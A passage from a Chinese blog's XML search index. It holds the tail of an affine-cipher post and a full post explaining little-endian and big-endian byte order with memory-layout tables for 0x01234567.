&gt;defendtheeastwallofthecastle</p><p>详见：https://cryptowikis.com/ClassicalCipher/SubstitutionCiphers/AffineCipher/</p>]]></content>
    
    
    <categories>
      
      <category>密码学</category>
      
    </categories>
    
    
    <tags>
      
      <tag>仿射密码</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>小端序与大端序</title>
    <link href="/2022/02/21/little-endian/"/>
    <url>/2022/02/21/little-endian/</url>
    
    <content type="html"><![CDATA[<p>今天在写逆向题目时遇到的一个知识点。</p><h2 id="字节顺序维基百科">字节顺序（维基百科）</h2><p>字节顺序，又称端序或尾序（英语：Endianness），在计算机科学领域中，指电脑内存中或在数字通信链路中，组成多字节的字的字节的排列顺序。</p><p>在几乎所有的机器上，多字节对象都被存储为连续的字节序列。例如在C语言中，一个类型为int的变量x地址为0x100，那么其对应地址表达式&amp;x的值为0x100。且x的四个字节将被存储在电脑内存的0x100,0x101, 0x102, 0x103位置。</p><p>字节的排列方式有两个通用规则。例如，将一个多位数的低位放在较小的地址处，高位放在较大的地址处，则称小端序；反之则称大端序。在网络应用中，字节序是一个必须被考虑的因素，因为不同机器类型可能采用不同标准的字节序，所以均按照网络标准转化。<br></p><p>下面以十六进制0x01234567为例其中 0x01 是最高位有效字节，0x67是最低位有效字节。</p><h2 id="小端序">小端序</h2><p>指机器选择在内存中按照从<strong>最低</strong>有效字节到<strong>最高</strong>有效字节的顺序存储对象。</p><table><thead><tr class="header"><th style="text-align: center;">.....</th><th style="text-align: center;">0x100</th><th style="text-align: center;">0x101</th><th style="text-align: center;">0x102</th><th style="text-align: center;">0x103</th><th style="text-align: center;">...</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">...</td><td style="text-align: center;">67</td><td style="text-align: center;">45</td><td style="text-align: center;">23</td><td style="text-align: center;">01</td><td style="text-align: center;"></td></tr></tbody></table><h2 id="大端序">大端序</h2><p>指机器选择在内存中按照从<strong>最高</strong>有效字节到<strong>最低</strong>有效字节的顺序存储对象。</p><table><thead><tr class="header"><th style="text-align: center;">.....</th><th style="text-align: center;">0x100</th><th style="text-align: center;">0x101</th><th style="text-align: center;">0x102</th><th style="text-align: center;">0x103</th><th style="text-align: center;">...</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">...</td><td style="text-align: center;">01</td><td style="text-align: center;">23</td><td style="text-align: center;">45</td><td style="text-align: center;">67</td><td style="text-align: center;">...</td></tr></tbody></table><p>参考https://oi-wiki.org/misc/endianness/</p><p>推荐文章：https://www.ruanyifeng.com/blog/2016/11/byte-order.html</p>]]></content>
    
    
    <categories>
      
      <category>字节顺序</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内存</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
